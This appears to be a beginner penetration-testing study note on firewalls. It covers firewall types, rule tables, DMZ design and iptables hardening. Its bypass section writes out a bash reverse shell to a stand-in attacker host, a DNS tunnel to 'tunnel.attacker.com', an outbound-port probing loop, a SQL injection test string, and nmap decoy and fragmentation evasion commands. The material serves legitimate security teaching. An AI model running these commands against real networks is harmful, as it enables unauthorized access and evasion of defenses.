---
tags: [vapt, foundations, networking, beginner]
difficulty: beginner
module: "01 - Foundations"
topic: "01.12 Firewalls — How They Work"
---

# 01.12 — Firewalls — How They Work

## What is it?

A **firewall** is a network security device (hardware or software) that monitors and controls incoming/outgoing network traffic based on predefined rules. It sits between your network and the outside world, deciding what to allow and what to block.

**Analogy:** A firewall is a bouncer at a club — it checks everyone at the door against a list of rules and decides who gets in or out.

---

## Types of Firewalls

```
GENERATION 1: Packet Filter (Stateless)
─────────────────────────────────────────
Inspects individual packets in isolation.
Rules based on: src IP, dst IP, src port, dst port, protocol.
Fast but dumb — no context about connections.

GENERATION 2: Stateful Inspection Firewall
─────────────────────────────────────────
Tracks connection state (SYN, SYN-ACK, ESTABLISHED).
Knows if a packet is part of an ongoing connection.
Can allow response packets without explicit inbound rules.

GENERATION 3: Application Layer Firewall (WAF)
─────────────────────────────────────────
Understands application protocols (HTTP, FTP, DNS).
Can inspect payload content, not just headers.
Blocks SQL injection, XSS patterns in HTTP requests.

GENERATION 4: Next-Gen Firewall (NGFW)
─────────────────────────────────────────
Combines stateful + app awareness + IDS/IPS + SSL inspection.
User-aware (knows identity, not just IP).
Examples: Palo Alto, Fortinet, Cisco ASA with FirePOWER.
```

---

## How Firewall Rules Work

```
Traffic arrives → Firewall checks rules top-to-bottom → First match wins

RULE TABLE (simplified):
╔════╦═══════════╦═══════════╦══════╦══════╦══════════╦════════╗
║ #  ║ Src IP    ║ Dst IP    ║ Src  ║ Dst  ║ Protocol ║ Action ║
║    ║           ║           ║ Port ║ Port ║          ║        ║
╠════╬═══════════╬═══════════╬══════╬══════╬══════════╬════════╣
║ 1  ║ ANY       ║ 10.0.0.5  ║ ANY  ║ 80   ║ TCP      ║ ALLOW  ║
║ 2  ║ ANY       ║ 10.0.0.5  ║ ANY  ║ 443  ║ TCP      ║ ALLOW  ║
║ 3  ║ 10.0.0.0/8║ ANY       ║ ANY  ║ ANY  ║ ANY      ║ ALLOW  ║
║ 4  ║ ANY       ║ ANY       ║ ANY  ║ ANY  ║ ANY      ║ DENY   ║ ← default deny
╚════╩═══════════╩═══════════╩══════╩══════╩══════════╩════════╝

Rule 4 = "Implicit Deny" — block everything not explicitly allowed
```

---

## Firewall Zones

```
INTERNET (untrusted)
        │
     [FIREWALL]
        │
    ┌───┴────────────────┐
    │                    │
  [DMZ]            [INTERNAL LAN]
  (semi-trusted)    (trusted)
    │
  Web Server        Database Servers
  Mail Server       File Servers
  DNS Server        Internal Apps
```

**DMZ (Demilitarized Zone):** Public-facing servers live here — isolated from internal network. If a web server in DMZ is compromised, attacker can't directly reach internal network.

---

## Security Context — Firewalls in VAPT

### 1. Firewall Detection

```bash
# Does traffic drop (filtered) or reject (closed)?
nmap -sS target          # TCP SYN scan
# filtered = firewall silently drops
# closed   = firewall sends RST (or nothing running)

# TTL-based OS detection (helps identify firewall OS)
nmap -O target

# Firewall banner via HTTP
curl -I https://target.com
# Server: nginx ← web server, not firewall
```

### 2. Firewall Bypass Techniques

**Technique 1: Use Allowed Ports**
```bash
# Most firewalls allow 80 (HTTP) and 443 (HTTPS)
# Run C2/shells on these ports to blend in

# If only port 443 outbound is allowed:
# Set up reverse shell on attacker port 443
nc -lvnp 443              ← attacker listens on 443
# On victim:
bash -i >& /dev/tcp/attacker-ip/443 0>&1
```

**Technique 2: Fragmented Packets**
```bash
# Split packets to confuse packet-filter firewalls
nmap -f target            # fragment probe packets
nmap --mtu 8 target       # specify fragmentation MTU
```

**Technique 3: Source Port Manipulation**
```bash
# Some firewalls allow inbound traffic from port 53 (DNS) or 80 (HTTP)
nmap -g 53 -sS target     # use source port 53
nmap -g 80 -sS target     # use source port 80
```

**Technique 4: Decoy Scanning**
```bash
# Make scan appear to come from multiple IPs
nmap -D RND:10 target     # random decoys
nmap -D 1.2.3.4,5.6.7.8,ME target  # specific decoys
```

**Technique 5: IPv6 — WAF/Firewall Bypass**
```bash
# Some firewalls only protect IPv4
dig target.com AAAA +short           # get IPv6 address
curl -6 http://[IPv6-address]/        # access via IPv6 directly
```

**Technique 6: Protocol Encapsulation**
```bash
# Tunnel traffic inside DNS (if DNS is allowed):
iodine -f -P password tunnel.attacker.com
# Tunnel traffic inside HTTP:
# Use reverse HTTP proxies: chisel, ligolo-ng, frp
```

### 3. Egress Filtering Detection

```bash
# Test which outbound ports are allowed from a compromised machine
# On attacker: listen on various ports
# On victim: try to connect out

for port in 21 22 23 25 53 80 443 1080 3389 4444 8080; do
  timeout 3 nc -z attacker-ip $port 2>/dev/null && echo "Port $port: OPEN" || echo "Port $port: BLOCKED"
done
```

### 4. iptables — Linux Firewall for Post-Exploitation

Once on a Linux box, view firewall rules:

```bash
# View all rules
iptables -L -n -v
iptables -L INPUT -n -v
iptables -L OUTPUT -n -v

# View NAT rules
iptables -t nat -L -n -v

# Windows Firewall (from compromised Windows host)
netsh advfirewall show allprofiles
netsh advfirewall firewall show rule name=all | findstr /i "allow\|block"
```

### 5. WAF Detection

```bash
# Wafw00f — WAF fingerprinting tool
wafw00f https://target.com

# Manual WAF detection:
# Send a known attack payload and watch response:
curl "https://target.com/?id=1' OR '1'='1"
# If 403 Forbidden or weird response → WAF is blocking
# If normal error → no WAF (or WAF in detect-only mode)

# Nmap WAF detection
nmap --script http-waf-detect target.com
nmap --script http-waf-fingerprint target.com
```

---

## Hands-On: Linux Firewall (iptables)

```bash
# Block all traffic by default
iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT DROP

# Allow established connections
iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
iptables -A OUTPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH from specific IP only
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.5 -j ACCEPT

# Allow HTTP/HTTPS from anywhere
iptables -A INPUT -p tcp -m multiport --dports 80,443 -j ACCEPT

# Allow all outbound from this machine
iptables -A OUTPUT -j ACCEPT

# Save rules
iptables-save > /etc/iptables/rules.v4
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| No default deny rule | Add implicit DENY ALL at end of ruleset |
| Overly permissive outbound rules | Restrict outbound to only needed services |
| Firewall allows all internal traffic | Segment with DMZ, apply east-west firewall rules |
| WAF in detect-only mode | Switch WAF to block mode, tune false positives |
| IPv6 not covered by firewall | Apply same rules to IPv6 as IPv4 |

---

## Related Notes
- [[11 - NAT and Private IP Ranges]] — NAT behind firewalls
- [[13 - Proxies Forward and Reverse]] — proxies work with firewalls
- [[Module 05 - Recon]] — firewall detection during recon
- [[Module 36 - WAF Bypass]] — bypassing web application firewalls
